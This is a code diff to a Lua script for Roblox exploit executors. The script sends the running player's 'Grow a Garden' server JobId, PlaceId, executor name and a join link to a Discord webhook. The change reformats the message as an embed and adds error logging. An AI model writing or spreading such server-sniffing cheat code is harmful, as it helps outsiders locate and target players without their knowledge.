@@ -30,14 +30,23 @@ end
 -- ✅ If valid, send to Discord
 if isLikelyJoinable() then
     local payload = {
-        content = "**📡 JobId Sniffed:** `" .. jobId .. "`\n" ..
-                  "**🧠 Executor Used:** `" .. executor .. "`\n" ..
-                  "**🚀 Click to Join:** <" .. redirectLink .. ">"
+        content = "", -- clean embed
+        embeds = {{
+            title = "📡 Grow a Garden Server Sniffed",
+            description = "Click below to open Roblox and join the exact server.",
+            url = redirectLink,
+            fields = {
+                {name = "JobId", value = jobId, inline = true},
+                {name = "Executor", value = executor, inline = true},
+                {name = "PlaceId", value = tostring(placeId), inline = true}
+            },
+            color = 65280
+        }}
     }
 
     local request = http_request or syn.request or request or fluxus.request
     if request then
-        pcall(function()
+        local success, err = pcall(function()
             request({
                 Url = webhook,
                 Method = "POST",
@@ -45,6 +54,11 @@ if isLikelyJoinable() then
                 Body = HttpService:JSONEncode(payload)
             })
         end)
+        if success then
+            print("✅ Server info sent to Discord.")
+        else
+            warn("❌ Discord request failed:", err)
+        end
     else
         warn("❌ No compatible request function found.")
     end
